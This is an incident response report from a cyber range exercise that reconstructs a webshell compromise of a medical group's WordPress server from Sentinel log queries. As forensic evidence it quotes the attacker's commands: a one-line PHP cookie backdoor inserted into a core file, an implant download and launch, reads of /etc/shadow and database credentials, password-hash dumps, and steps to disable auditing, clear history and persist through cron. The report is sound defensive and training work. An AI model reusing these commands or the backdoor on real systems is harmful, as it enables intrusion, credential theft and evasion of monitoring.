# Incident Response Report: Operation PHP2Shell

**The Hartwell Breach** · LOG(N) Pacific Cyber Range · Author: Aldo Anthony · Issued 2026-11-12 · Framework: NIST SP 800-61r3 + SANS PICERL

[← Back to the summary](README.md)

## 01 Front Matter and Document Control

| **Report title**       | **Operation PHP2Shell: Web Exploit to Webshell on the Hartwell Medical Group WordPress Server** |
|------------------------|-------------------------------------------------------------------------------------------------|
| **Incident reference** | **PHP2Shell (Hartwell IT incident request, 2026-10-23)**                                        |
| **Author**             | **Aldo Anthony**                                                                                |
| **Version**            | **1.0**                                                                                         |
| **Date issued (UTC)**  | **2026-11-12 UTC**                                                                              |
| **Classification**     | **TLP:CLEAR** (published range exercise; originally issued as TLP:AMBER to the range)          |
| **Distribution**       | **LOG(N) Pacific Cyber Range**                                                                  |

### Revision history

| **Version** | **Date (UTC)** | **Author**   | **Change**                                                        |
|-------------|----------------|--------------|-------------------------------------------------------------------|
| 0.1         | 2026-11-09     | Aldo Anthony | Hunt session: 18 flags across 8 sections, one host, seven tables. |
| 1.0         | 2026-11-12     | Aldo Anthony | First issued version.                                             |

### Use of AI

I used Claude (Anthropic) as an assistant on this hunt and this report.
During the hunt it wrote KQL queries for each flag, adapted from the
platform’s starter queries and the KQL lessons from my earlier hunts,
and suggested an answer from each result. I ran every query myself in
LAW-HuntPractice, checked each suggested answer against the returned
rows and chose what to submit. For the report, it drafted text from my
findings and result files and checked my drafts against the evidence. I
reviewed and approved all of it. Every fact, number and timestamp comes
from a query result in Appendix A.

## 02 Executive Summary

On 23 October 2026 an attacker took control of Hartwell Medical Group’s
public website server, the one patients use to book appointments. The
attacker scanned the site and then attacked a known flaw in the server’s
web software three times during the day. The documented fix for that
flaw does not appear to have been applied. Less than a minute after the
first attack, a staff administration account was used to place a hidden
control file on the site. That file let the attacker run commands on the
server through ordinary-looking web requests.

Within three minutes the attacker had:

- explored the server and its network

- read the website’s database password from a settings file

- copied the site’s user accounts: names, email addresses and scrambled
  (hashed) passwords

- packaged that data and encoded it for sending back through the control
  file

- tried to switch off the security monitoring and erase its own tracks

- set up three separate ways back in, including hidden code inside one
  of the website’s own core files

- left a note on the site claiming that patient records had been
  encrypted, and demanding a ransom

The monitoring kept recording throughout, which is why this report can
reconstruct those minutes. The logs I reviewed show no encryption and no
query against patient or appointment data.

Later that day someone removed the control file and the ransom note. Two
of the three ways back in were left in place, and the attacker returned
within minutes.

What I can prove: the database password and the user records were
accessed, and the server sent responses back while the attacker was
packaging them. What I cannot prove: what those responses contained. The
password and user records should be treated as taken. I found no sign
that the attacker reached any other system. How the attacker came to act
through the staff account is not recorded.

The attack was not contained. The attacker’s hidden program was still
running after the investigation window closed, and all logging stopped
for 78 minutes during the day, so that period can’t be seen.

What must change first: switch off the vulnerable feature; lock the
staff account and remove its unexplained access key; restore the
website’s core files from a clean copy; change the database password and
reset users’ passwords.

## 03 Incident Overview

| **Incident reference**  | PHP2Shell (Hartwell IT incident request, 2026-10-23)                                                                                                                                                                                                                                                                                                                                                                                                                                      |
|-------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Severity / priority** | High                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| **Status**              | Investigated, not contained. Range exercise: I took no containment actions. A root session deleted health-check.php, NOTICE.txt and the www-data crontab at 2026-10-23 13:52:38 UTC. It did not remove the implant or the second backdoor in wp-includes/version.php (F6), and the attacker was back in control by 14:01:23 UTC.                                                                                                                                                          |
| **Detected (UTC)**      | 2026-10-23. The brief reports auditd alerts for file writes to the web root by www-data. The alert time is not recorded in the workspace.                                                                                                                                                                                                                                                                                                                                                 |
| **Detected by**         | auditd custom detection rules on debian13 (per the brief)                                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Contained (UTC)**     | Not contained. Last webshell command observed: 2026-10-23 14:19:26 UTC. The implant was still running on its cron schedule at 15:55:01 UTC, the last run in the window.                                                                                                                                                                                                                                                                                                                   |
| **Closed (UTC)**        | Not closed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Incident type**       | Webshell on the public WordPress server, followed by discovery, credential access, data staging, anti-forensics, a failed attempt to disable monitoring, cron and webshell persistence, data returned through the webshell, and a ransom note claiming encryption that the logs do not show. The webshell file was written by the debian account over SSH. PHP session upload progress exploit requests (CVE-2026-109618 / CVE-2026-109619, per the brief) began 38 seconds earlier (F1). |
| **Systems affected**    | debian13 (192.168.1.120) only. No evidence of activity on any other host.                                                                                                                                                                                                                                                                                                                                                                                                                 |
| **Identities affected** | www-data: every webshell command ran in the web server’s process context. debian: an SSH session as debian wrote health-check.php at 04:34:31 and touched all three attacker files at 04:39:09; treat it as compromised (F1). wpuser: the MySQL credential was read from wp-config.php and used (F4). WordPress user accounts: their password hashes were queried from wp_users; which rows came back is not recorded.                                                                    |

## 04 Scope and Data Sources

Investigation scope: one host, debian13 (192.168.1.120), in workspace
LAW-HuntPractice. Window: 2026-10-23 04:00:00 to 16:00:00 UTC. All times
in this report are on the Apache access-log clock; error-log times are
corrected by +4 hours (G7).

| **Data source**         | **Platform**                                                 | **Period available (UTC)**                          | **Coverage confidence**                                                                                                                             |
|-------------------------|--------------------------------------------------------------|-----------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------|
| HartwellApache_CL       | Sentinel custom table: Apache access log                     | 2026-10-23 03:18:14 – 17:49:33                      | High. Method, URI, status, response size and user agent for every request. No request bodies or custom headers.                                     |
| HartwellHTTPEnriched_CL | Sentinel custom table: HTTP log enriched from packet capture | 2026-10-23 07:25:15 – 14:19:26                      | Medium. Decodes the webshell’s command header. Starts three hours into the window (G2). No request or response bodies (G3, G4).                     |
| HartwellApacheError_CL  | Sentinel custom table: Apache error log                      | 2026-10-22 23:17:08 – 2026-10-23 11:10:26 as logged | Medium. PHP warnings and parse errors, but the clock is 4 hours behind (G7).                                                                        |
| HartwellSysmon_CL       | Sentinel custom table: Sysmon for Linux                      | 2026-10-23 05:24:31 – 17:49:50                      | Medium. Full process lineage and command lines. Starts after the attack began (G1). Network and file events carry no destination or file path (G6). |
| HartwellAudit_CL        | Sentinel custom table: auditd                                | 2026-10-23 03:40:44 – 17:49:49                      | High. Raw syscall, execve and path records with full command arguments. The only process-level source before 05:24:31 (Query 32).                   |
| HartwellAuth_CL         | Sentinel custom table: auth.log                              | 2026-10-22 00:48:48 – 2026-10-23 17:49:52           | Medium. SSH and sudo, including the previous day. It has no record of the debian SSH session that auditd shows from 04:34:23 (G11).                 |
| HartwellSyslog_CL       | Sentinel custom table: syslog                                | 2026-10-22 00:48:48 – 2026-10-23 17:49:52           | Medium. Service and cron messages, mixed with forwarded Sysmon records.                                                                             |

### Gaps

| **\#** | **What I could not see**                                                                                                                                         | **Effect on conclusions**                                                                                                                                                                             |
|--------|------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| G1     | Sysmon before 05:24:31. The webshell first ran a command at 04:34:34.                                                                                            | The first 50 minutes are visible through auditd only. auditd records every command and its arguments from 04:34:34 (Query 32), but not Sysmon’s parent-child process tree.                            |
| G2     | Enriched HTTP before 07:25:15. Decoded webshell commands appear only from 14:01:23 to 14:19:26.                                                                  | Commands before 14:01:23 are known from process and audit events only. I can’t show which request carried them.                                                                                       |
| G3     | Request bodies, in every web table. No web table contains upload_progress (Query 4).                                                                             | The session.upload_progress payload is not visible. The exploit mechanism is taken from the brief’s threat intelligence, supported by the timing of the PHP session warnings and the multipart POSTs. |
| G4     | Response bodies.                                                                                                                                                 | I can show that data was encoded and that responses of a given size were returned. I cannot show the content that left.                                                                               |
| G5     | The output of any command.                                                                                                                                       | What discovery, the configuration reads and the database queries actually returned is unknown. Queried is not the same as returned.                                                                   |
| G6     | Destinations on Sysmon network events and paths on file events.                                                                                                  | Where the implant connected is unknown. The lateral-movement conclusion rests on commands and authentication, not on network destinations.                                                            |
| G7     | A consistent clock. The error log runs exactly 4 hours behind: 8 of 8 parse errors match an Apache 500 at +14,400 seconds (Query 22).                            | Corrected throughout. Uncorrected, the exploit would appear 4 hours early.                                                                                                                            |
| G8     | The time of the auditd alert that opened the incident.                                                                                                           | Dwell time to detection can’t be calculated.                                                                                                                                                          |
| G9     | Any telemetry from 2026-10-23 12:26:43 to 13:44:49. All seven tables stop and resume together (Query 25).                                                        | Nothing that happened in those 78 minutes is visible. The outcome of the 12:26 stop attempts can’t be measured.                                                                                       |
| G10    | File hashes. Sysmon’s Hashes field is empty for every event checked (Query 26).                                                                                  | The two versions of /dev/shm/.cache-helper can’t be told apart by hash, and the IOC list has no file hashes.                                                                                          |
| G11    | The source of the debian SSH session. auditd records a debian sshd session from 04:34:23 (Query 32), but the auth log holds no login before 15:07:05 (Query 27). | I can show that the debian account wrote the webshell (F1). I can’t show where that session connected from.                                                                                           |

## 05 UTC Timeline

All times are on the access-log clock. Error-log times are corrected by
+4 hours (G7).

| **Time (UTC)**                 | **Event**                                                                                                                                                                                                                       | **Source**                                      | **Evidence ref**                                |
|--------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------|-------------------------------------------------|
| 2026-10-23 04:32:44 – 04:33:53 | 192.168.1.100 scans with the Nmap Scripting Engine, then makes its first exploit run: POST /index.php with PHP session warnings in the same second                                                                              | HartwellApache_CL, HartwellApacheError_CL       | Query 2, Query 23                               |
| 2026-10-23 04:34:31 – 04:34:34 | An SSH session as debian creates /var/www/html/health-check.php and changes its owner; the webshell runs its first command (id) 4 ms later and returns 200 to 192.168.1.100                                                     | HartwellAudit_CL, HartwellApache_CL             | Query 33, Query 32, Query 7                     |
| 2026-10-23 04:34:44 – 04:34:50 | Webshell downloads /tmp/.update from 127.0.0.1:8085 and starts it                                                                                                                                                               | HartwellAudit_CL                                | Query 32                                        |
| 2026-10-23 04:35:20 – 04:35:54 | Discovery; wp-config.php DB\_ lines read; wp_users and wp_options queried; wp_users dump and wp-config.php packed into /tmp/.backup.tar.gz                                                                                      | HartwellAudit_CL                                | Query 32                                        |
| 2026-10-23 04:36:21 – 04:36:59 | health-check.php timestamp copied from wp-login.php; implant moved to /dev/shm/.cache-helper; auditctl -D, systemctl stop sysmon and history cleared; wp-config.php and the wp_users dump Base64-encoded; staging files deleted | HartwellAudit_CL                                | Query 32                                        |
| 2026-10-23 04:37:19            | Five-minute crontab entry for the implant; backdoor added to wp-includes/version.php; ransom note written to /var/www/html/NOTICE.txt                                                                                           | HartwellAudit_CL                                | Query 32, Query 33                              |
| 2026-10-23 04:39:09            | debian touches health-check.php, NOTICE.txt and version.php                                                                                                                                                                     | HartwellAudit_CL                                | Query 33                                        |
| 2026-10-23 12:18:05            | Second exploit run: PHP session warnings from 192.168.1.100                                                                                                                                                                     | HartwellApacheError_CL                          | Query 3, Query 22                               |
| 2026-10-23 12:21:07 – 12:26:06 | Webshell commands resume: discovery, wp-config.php and wp_users again, implant re-downloaded and crontab re-added, stop attempts on sysmon, auditd and SplunkForwarder                                                          | HartwellSysmon_CL                               | Query 8, Query 12, Query 14, Query 15, Query 17 |
| 2026-10-23 12:26:43 – 13:44:49 | All seven tables stop logging, then resume together                                                                                                                                                                             | All tables                                      | Query 25                                        |
| 2026-10-23 13:52:38            | root deletes health-check.php, NOTICE.txt and the www-data crontab; the implant and version.php are left in place                                                                                                               | HartwellSysmon_CL                               | Query 7                                         |
| 2026-10-23 13:53:35 – 13:57:00 | Third exploit run: POST multipart/form-data from 192.168.1.100 with PHP session warnings                                                                                                                                        | HartwellHTTPEnriched_CL, HartwellApacheError_CL | Query 5, Query 23                               |
| 2026-10-23 14:01:23 – 14:19:26 | Commands sent in the X-HMG-Debug header, including Base64 of wp-config.php and wp_users (200 responses of 4,004 and 1,240 bytes) and the crontab reinstalled at 14:16:00                                                        | HartwellHTTPEnriched_CL, HartwellApache_CL      | Query 9, Query 18, Query 19                     |
| 2026-10-23 15:07:05            | First SSH login recorded in the auth log: debian, from 192.168.1.100                                                                                                                                                            | HartwellAuth_CL                                 | Query 27                                        |
| 2026-10-23 15:55:01            | Last execution of /dev/shm/.cache-helper in the window                                                                                                                                                                          | HartwellAudit_CL                                | Query 18                                        |

## 06 Findings

### F1: One external host scanned and exploited the server; the webshell file was written by the debian account

**State it:** 192.168.1.100 scanned debian13 and triggered PHP session
errors in three separate runs, the first at 2026-10-23 04:33:53 UTC. 38
seconds later, an SSH session running as debian created health-check.php
in the web root. The webshell ran its first command 4 ms after debian
changed the file’s owner.

**Show it:**

- **Scanner:** HartwellApache_CL. 192.168.1.100 is the only external
  source of requests. Its user agents include Nmap Scripting Engine,
  first seen at 04:32:44 (Query 1, Query 2).

- **Exploit runs:** HartwellApacheError_CL, corrected +4 hours (G7). PHP
  Request Startup session warnings come from 192.168.1.100 only,
  starting at:

  - 04:33:53, with POST /index.php (Query 23)

  - 12:18:05 (Query 3)

  - 13:53:35, with POST multipart/form-data (Query 5)

- **The file:** HartwellAudit_CL, key="webroot_write" (Query 33):

  - 04:34:31.140: /usr/bin/bash, account debian, path
    /var/www/html/health-check.php

  - 04:34:34.504: /usr/bin/chown, account debian, same path

> auditd records a debian sshd-session from 04:34:23 (Query 32).

- **First use:** 04:34:34.508, sh -c -- id, key="php_worker_exec" (Query
  32). Apache returned 404 for the file at 04:34:23 and 200 at 04:34:34
  (Query 7).

**Interpret it:**

- **The exploit:** session warnings at request start-up, only from the
  scanner and only alongside its POSTs, mark exploitation of PHP’s
  session handling. The brief names session.upload_progress. Request
  bodies are not logged (G3). **Confidence: Medium.**

- **How the webshell arrived:** no log shows PHP writing the file; a
  debian shell over SSH wrote it. Where that session came from is not
  logged (G11). **Confidence: High** that the debian session wrote it.

- **The debian account:** it also touched the attacker’s other two files
  at 04:39:09 (F6). That’s not package work. **Confidence: Medium** that
  the attacker controlled it.

### F2: The webshell took encoded commands in a custom header and ran them as www-data

**State it:** health-check.php took its commands from a custom HTTP
header, X-HMG-Debug, rather than from the URL, so the commands never
appeared in the access log. Each value was ROT13-encoded and then
Base64-encoded. Apache ran the commands through a shell as www-data.

**Show it:**

- **The header:** HartwellHTTPEnriched_CL. Requests from 192.168.1.100
  to /health-check.php carry the key "X-HMG-Debug" in request_headers,
  from 2026-10-23 14:01:23 to 14:19:26 UTC (Query 9). For example,
  ZmxmZ3J6KCJ2cSIpOw== decodes to system("id");.

- **The encoding:** Base64-decoding every x_hmg_debug_raw value and then
  applying ROT13 reproduces x_hmg_debug_decoded exactly, with no
  exceptions (Query 10).

- **Execution:** HartwellSysmon_CL. Shells with ParentImage
  /usr/sbin/apache2, Image /usr/bin/dash and User www-data run from
  12:21:07 to 14:19:10 (Query 8). Before Sysmon was running, auditd
  records the same pattern, sh -c -- followed by the command, under the
  rule key="php_worker_exec" from 04:34:34 (Query 32).

| **Header (HTTPEnriched)**                                            | **Process (Sysmon, www-data)**                                       |
|----------------------------------------------------------------------|----------------------------------------------------------------------|
| 14:14:39.508 system('base64 /var/www/html/wp-config.php');           | 14:14:39.509 base64 /var/www/html/wp-config.php (Query 13, Query 19) |
| 14:15:49.661 system('cp /usr/bin/sleep /dev/shm/.cache-helper ...'); | 14:15:49.662 same command (Query 18)                                 |
| 14:16:00.689 system("(crontab -l ...) \| crontab -");                | 14:16:00.690 same command (Query 18)                                 |

- **Eval:** HartwellApacheError_CL logs PHP parse errors in
  /var/www/html/health-check.php(N) : eval()'d code from 12:22:04 to
  14:19:26, corrected (Query 23).

**Interpret it:**

- **How it works:** the webshell decodes the header and passes the
  result to PHP’s eval. The parse errors show that malformed input
  reached eval, and the matched processes show that well-formed commands
  ran. **Confidence: High.**

- **Commands before 14:01:23:** the shells from 04:34 and from 12:21
  onwards have the same form and parent, but no header evidence, because
  the enriched log doesn’t capture them (G2). That they came through the
  same webshell: **Confidence: Medium.**

- **The encoding:** this is obfuscation, not encryption. Both layers are
  built into PHP and need no key, enough to beat keyword matching on
  system( but reversible in one query.

### F3: The attacker mapped the host, its network and its monitoring

**State it:** Through the webshell, www-data ran commands to identify
the host, map the local network and find security tooling. It searched
for nine security products by name, and the three it later tried to stop
are Sysmon, auditd and the Splunk forwarder.

**Show it:** HartwellSysmon_CL, all User www-data, ParentImage
/usr/sbin/apache2:

- **First run, before Sysmon** (HartwellAudit_CL, Query 32): at
  04:35:20, whoami;id;hostname;uname -a, ip a \| grep inet, ss -tlnp, ps
  aux \| head -20 and crontab -l; at 04:35:34, arp -a, dpkg -l \| grep
  -iE 'sysmon\|splunk\|audit\|snort\|suricata\|ossec\|wazuh' and ps aux
  \| grep -iE 'sysmon\|splunk\|audit'.

- **Host and accounts:** id, whoami, uname -a, hostname, cat /etc/passwd
  \| grep -v nologin \| grep -v false and cat /etc/shadow 2\>&1 \| head
  -3 (Query 8).

- **Network:** (Query 11)

  - ss -tlnp: 12:22:10 and 14:02:28

  - ip neigh: 12:24:42 and 14:12:57

  - ip addr show: 14:12:49

  - cat /etc/resolv.conf: 12:24:42 and 14:13:09

- **SSH keys:** find /home -name authorized_keys -o -name id_rsa -o
  -name id_ed25519; ls -la /home/debian/.ssh/ at 12:24:38 (Query 12).

- **Monitoring:** (Query 12)

  - 12:24:48: dpkg -l \| grep -iE
    splunk.sysmon.auditd.ossec.wazuh.snort.suricata.aide.tripwire

  - 12:24:53: ps aux \| grep -iE sysmon.splunk.audit

  - 12:25:01: ls -la /opt/sysmon/; ls -la
    /opt/splunkforwarder/bin/splunk

  - 12:25:06: auditctl -l; cat /etc/audit/audit.rules

  - 12:25:10: find /opt -name sysmon -type f

  - 14:13:21: systemctl list-units --type=service --state=running

**Interpret it:**

- **What is proven:** these commands ran. Sysmon records command lines,
  not output (G5), so what the attacker actually saw is not recorded.

- **What was found:** after searching for nine products, the attacker
  narrowed to sysmon, splunk and audit, then targeted exactly those
  three services (F5). The brief confirms all three run on debian13.
  That the attacker identified these three: **Confidence: Medium.**

- **The pattern:** the same sequence (who am I, what is listening, who
  is nearby, what is watching) runs three times: at 04:35, at
  12:22–12:25 and at 14:02–14:13.

- **SSH keys:** the attacker looked for keys. Whether any were found is
  not recorded, and no key use appears anywhere (F8).

### F4: Database credentials were read from wp-config.php and used to query WordPress password hashes

**State it:** www-data read the database lines from wp-config.php, then
used the MySQL client as wpuser to query the WordPress user table,
including the password-hash column, and the site's settings table. The
database password appears in clear text in the logged command lines.

**Show it:** HartwellSysmon_CL, all User www-data, ParentImage
/usr/sbin/apache2 (Query 13, Query 14):

| **Time (UTC)**      | **Command**                                                                                                                                    |
|---------------------|------------------------------------------------------------------------------------------------------------------------------------------------|
| **04:35:27**        | grep -E 'DB_NAME\|DB_USER\|DB_PASSWORD\|DB_HOST' /var/www/html/wp-config.php (auditd, Query 32)                                                |
| 04:35:27            | mysql -u wpuser -p\[redacted\] wordpress -e 'SELECT user_login,user_email,user_pass FROM wp_users' (auditd, Query 32)                          |
| 04:35:34            | SELECT option_name,option_value FROM wp_options WHERE option_name IN ("siteurl","blogname","admin_email","blogdescription") (auditd, Query 32) |
| 04:35:54            | SELECT \* FROM wp_users \> /tmp/.db_dump.txt (auditd, Query 32; F7)                                                                            |
| 04:36:59            | SELECT \* FROM wp_users \> /dev/shm/.wp_dump (auditd, Query 32; F7)                                                                            |
| 12:24:23            | grep -E DB\_ /var/www/html/wp-config.php                                                                                                       |
| 12:24:28            | mysql -u wpuser -p\[redacted\] wordpress -e "SELECT user_login,user_email,user_registered FROM wp_users"                                       |
| 12:24:33            | mysql -u wpuser -p\[redacted\] wordpress -e "SELECT user_login,user_pass FROM wp_users"                                                        |
| 14:03:31 – 14:03:42 | The same two queries without -p, output sent to 2\>/dev/null                                                                                   |
| 14:08:11            | grep DB\_ /var/www/html/wp-config.php                                                                                                          |
| 14:09:06 – 14:09:16 | The same two queries with -p\[redacted\]                                                                                                       |
| 14:15:15            | SELECT \* FROM wp_users piped to base64 (F7)                                                                                                   |

HartwellApacheError_CL, corrected: parse errors on "DB_NAME" (12:24:16),
"DB\_" (14:03:10) and "SELECT" (14:08:36, 14:08:54) in
health-check.php’s eval’d code (Query 23).

**Interpret it:**

- **Where the password came from:** each run of password queries follows
  a DB\_ grep of wp-config.php within seconds. The 14:03 attempts
  without a password come before the 14:08 grep, and the attempts with
  the password come after it. The parse errors show the attacker first
  tried to reach the same values through PHP. That the credential came
  from wp-config.php: **Confidence: High.**

- **What was taken:** the user_pass column was queried in every run
  (04:35:27, 12:24:33, 14:03:42, 14:09:16), and the whole wp_users table
  three times. The site’s admin email was queried from wp_options. No
  output is logged (G5), so which rows came back is not recorded.
  **Queried, not proven returned.**

- **A second exposure:** the wpuser password is now in Sysmon’s process
  logs, readable by anyone with log access. It needs rotating regardless
  (Recommendations).

### F5: The attacker tried to blind monitoring and cover its tracks; the monitoring held where it can be measured

**State it:** The attacker tried to delete the audit rules and stop
Sysmon, auditd and the Splunk forwarder in all three runs. It also faked
a file timestamp, cleared its shell history and deleted its staging
files. auditd kept recording every step.

**Show it:**

- **Stop attempts:**

  - 04:36:45: auditctl -D and systemctl stop sysmon (HartwellAudit_CL,
    Query 32)

  - 12:26:02–12:26:06: systemctl stop on sysmon, auditd and
    SplunkForwarder (HartwellSysmon_CL, Query 15)

  - 14:13:55–14:14:07: auditctl -D, then systemctl stop on sysmon and
    SplunkForwarder (Query 15)

- **Covering tracks** (HartwellAudit_CL, Query 32):

  - 04:36:21: touch -r /var/www/html/wp-login.php
    /var/www/html/health-check.php, then rm -f /tmp/.update

  - 04:36:45: unset HISTFILE;history -c

  - 04:36:59: rm -f /dev/shm/.wp_dump /tmp/.db_dump.txt
    /tmp/.backup.tar.gz

  - 14:18:52–14:19:10: checks what was recorded with tail on the Apache
    and Sysmon logs, ausearch -ui 33 and journalctl -u sysmon (Query 34)

- **Outcome:**

  - The audit rule php_worker_exec keeps firing after 04:36:45 and after
    14:13:55 (Query 32, Query 24).

  - No SERVICE_STOP or CONFIG_CHANGE record exists for these services
    (Query 16, Query 24).

  - Sysmon logs every minute from 14:08 to 14:24 (Query 24).

  - After 12:26, all seven tables stop together and resume at 13:44:49
    (Query 25).

**Interpret it:**

- **Why it failed:** the commands ran in the web server’s context, which
  can’t stop services without root. No denial was logged. **Confidence:
  Medium.**

- **04:36 and 12:26:** Sysmon wasn’t running yet at 04:36 (G1). The
  12:26 silence hit the access log too, so it wasn’t selective evasion
  (G9). **Confidence: Medium.**

- **The cover-up didn’t work:** the copied timestamp makes
  health-check.php look as old as WordPress itself on disk, but auditd
  recorded the change.

### F6: Three persistence mechanisms; a cleanup removed one and left two

**State it:** In its first three minutes the attacker set up three ways
back in:

- an implant in /dev/shm

- a five-minute cron job to run it

- a second webshell hidden inside a WordPress core file, triggered by a
  cookie

A root cleanup at 13:52:38 removed the cron job and health-check.php,
but left the implant and the WordPress backdoor in place.

**Show it:**

- **Implant** (HartwellAudit_CL, Query 32):

  - 04:34:44: curl -s -o /tmp/.update http://127.0.0.1:8085/update

  - 04:36:21: cp /tmp/.update /dev/shm/.cache-helper

  - 04:36:22: nohup /dev/shm/.cache-helper &

> It runs as www-data every five minutes from 04:40:01 (Query 18, Query
> 31). Re-downloaded at 12:25:23 (Query 17). Replaced with a copy of
> /usr/bin/sleep at 14:15:49 (Query 18).

- **Cron:** echo '\*/5 \* \* \* \* /dev/shm/.cache-helper' \| crontab -
  at 04:37:19 (Query 32). Re-added at 12:25:38 and 14:16:00 (Query 17).

- **WordPress backdoor:** 04:37:19. sed -i inserts \<?php
  if(isset(\$\_COOKIE\["X-Debug-Mode"\]))system(\$\_COOKIE\["X-Debug-Mode"\]);?\>
  into /var/www/html/wp-includes/version.php (Query 32, Query 33).

- **debian:** touches health-check.php, NOTICE.txt and version.php at
  04:39:09 (Query 33).

- **Cleanup:** root runs rm -f /var/www/html/health-check.php
  /var/www/html/NOTICE.txt && crontab -u www-data -r at 13:52:38 (Query
  7).

- **Still running:** the implant last runs at 17:45:01, after the window
  (Query 31).

**Interpret it:**

- **Persistence that survives the obvious fix:** deleting
  health-check.php left a working command channel in version.php. Any
  request with an X-Debug-Mode cookie runs a command. **Confidence:
  High.**

- **Two implants:** the first made network connections (05:25–12:25) and
  the second is sleep. No hashes were recorded (G10), and no
  destinations (G6).

- **Use of the cookie backdoor:** every command the web server ran in
  the window belongs to the first run or to the webshell sessions
  already described, so there is no sign the version.php backdoor was
  used before 16:00 (Query 34). It remains in place (Section 09).

### F7: Stolen data was staged, encoded and returned through the webshell; a ransom note claimed encryption that the logs don’t show

**State it:** The attacker packed wp-config.php and a full wp_users dump
into an archive, Base64-encoded both files through the webshell twice,
and deleted the staging files. It then left a ransom note claiming that
patient records were encrypted.

**Show it:**

- **Staging** (HartwellAudit_CL, Query 32):

  - 04:35:54: SELECT \* FROM wp_users \> /tmp/.db_dump.txt, then tar czf
    /tmp/.backup.tar.gz -C / var/www/html/wp-config.php tmp/.db_dump.txt

  - 04:36:59: base64 /var/www/html/wp-config.php and base64
    /dev/shm/.wp_dump, then the three staging files deleted (F5)

> POST /health-check.php returned 200 to 192.168.1.100 from 04:36:45 to
> 04:37:19 (Query 23).

- **Second time:** decoded X-HMG-Debug commands base64
  /var/www/html/wp-config.php (14:14:39) and SELECT \* FROM wp_users …
  \| base64 (14:15:15). Each matches a 200 response in the same second,
  of 4,004 and 1,240 bytes (Query 19).

- **No other channel:** no command uses scp, rsync, nc, ssh, or
  curl/wget to send data out (Query 20).

- **Ransom note:** 04:37:19, cat \> /var/www/html/NOTICE.txt. It claims
  “All patient records, billing data, and system files have been
  encrypted with RSA-4096” and demands 15 BTC (Query 32, Query 33). It
  was removed at 13:52:38 (F6).

**Interpret it:**

- **Confirmed accessed:** wp-config.php and the full wp_users table
  (F4).

- **Not confirmed exfiltrated:** response bodies aren’t logged (G4), and
  the 04:36 response sizes weren’t checked. The archive was deleted,
  with no sign that it left. That encoded data left in the responses:
  **Confidence: Medium.**

- **The ransom claim:** no encryption command appears in the first-run
  record (Query 32). A full sweep wasn’t done. That the note is pressure
  rather than real encryption: **Confidence: Medium.**

### F8: No evidence of lateral movement; look-alike activity triaged

**State it:** Nothing in the telemetry shows the attacker reaching
another host. Several patterns resemble the attack, and the evidence
separates each one from it, except the debian SSH activity, which is
tied to the attacker's files (F1).

**Show it:**

- **Lateral movement:** no decoded command or www-data process uses ssh,
  scp, rsync, nc or /dev/tcp, or names another internal address. The
  only SSH-related command is a local key search (Query 20, F3).
  HartwellAuth_CL shows only logins into debian13 (Query 27).

- **Look-alikes:**

| **Pattern**                                                                                                                                                  | **Evidence**                                                                                                                              | **Verdict**                                    |
|--------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------|
| Browser and crawler user agents from 192.168.1.100 (iPhone, iPad, Android, Mac, Windows, Linux Chrome, Googlebot, zgrab)                                     | GET only, public pages, never health-check.php, no POST outside the login pages (Query 28)                                                | Background traffic sharing the source address  |
| Scanner and crawler user agents from 192.168.1.120 and ::1 (masscan, Expanse, zgrab, YandexBot, bingbot, curl)                                               | The server’s own and loopback addresses; GET only; never health-check.php (Query 28)                                                      | Not external scanning; noise                   |
| root running logger, tee and apache-log-backup.sh under apache2, 15:08–15:09                                                                                 | Follows debian’s sudo changes to rsyslog and Apache logging (Query 8, Query 27)                                                           | Logging reconfiguration, not webshell activity |
| SSH as debian: a session from 04:34:23 (auditd only) and logins from 192.168.1.100 from 15:07:05 with key SHA256:3KKg2KTuBmrcaaoBtXv0x5nq4UfcqGO70g2BDJUjPKo | The 04:34 session wrote and touched the attacker’s files (Query 33). The 15:07 sessions ran log review and logging setup only (Query 27). | **Not noise.** Tied to the attack (F1).        |

**Interpret it:**

- **Lateral movement:** no evidence of it. Sysmon records no connection
  destinations (G6), so this rests on commands and authentication.
  **Confidence: Medium.**

- **The SSH sessions:** the 15:07 sessions look like administration, but
  they come from the attacker’s address, and the same account wrote the
  webshell at 04:34 (F1). That the account was under the attacker’s
  control: **Confidence: Medium.**

The ATT&CK mapping for these findings is in Appendix B.3 and the
indicators of compromise in Appendix B.2.

## 07 Impact and Dwell Time

| **First malicious activity (UTC)** | 2026-10-23 04:04:26 UTC: first request from 192.168.1.100, user agent curl/8.5.0, which later sent requests to the webshell (Query 2, Query 28). First exploit request: 04:33:53. Webshell written: 04:34:31 (F1).                                                                                                                                                                                                                                                                                                                                              |
|------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **First detection (UTC)**          | 2026-10-23. The brief reports auditd alerts; the alert time is not in the workspace (G8).                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| **Dwell time to detection**        | Cannot be calculated without the alert time (G8).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| **Time to containment**            | Not contained. The implant was still running on schedule at 15:55:01, 11 h 21 min after the first exploit request, and again at 17:45:01, after the window. The version.php backdoor was never removed (F6).                                                                                                                                                                                                                                                                                                                                                    |
| **Data confirmed accessed**        | wp-config.php: database lines read at 04:35:27, 12:24:23 and 14:08:11; the whole file packed into an archive at 04:35:54 and Base64-encoded at 04:36:59 and 14:14:39 (F4, F7). wp_users: user_login, user_email and user_pass queried in every run, and every column three times (F4, F7). wp_options: siteurl, blogname, admin_email and blogdescription (F4). The commands ran; their output is not recorded (G5).                                                                                                                                            |
